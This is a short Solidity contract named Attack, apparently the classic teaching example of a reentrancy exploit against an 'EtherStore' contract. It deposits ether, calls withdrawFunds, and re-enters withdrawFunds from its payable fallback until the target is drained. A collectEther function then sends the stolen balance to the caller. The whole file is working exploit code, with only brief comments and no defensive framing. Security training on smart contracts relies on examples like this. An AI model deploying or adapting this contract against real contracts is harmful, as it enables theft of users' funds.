import "./EtherStore.sol";

contract Attack {
	EtherStore public etherStore;

	// initialise the etherStore variable with the contract address
	constructor(address _etherStoreAddress) {
		etherStore = EtherStore(_etherStoreAddress);
	}

	function pwnEtherStore() public payable {
		// attack to the nearest ether
		require(msg.value >= 1e18);
		// send eth to the depositFunds() function
		etherStore.depositFunds.value(1e18)();
		// start the magic
		etherStore.withdrawFunds(1e18);
	}

	function collectEther() public {
		msg.sender.transfer(this.balance);
	}

	// fallback function - where the magic happens
	function () payable {
		if (etherStore.balance > 1e18) {
			etherStore.withdrawFunds(1e18);
		}
	}
}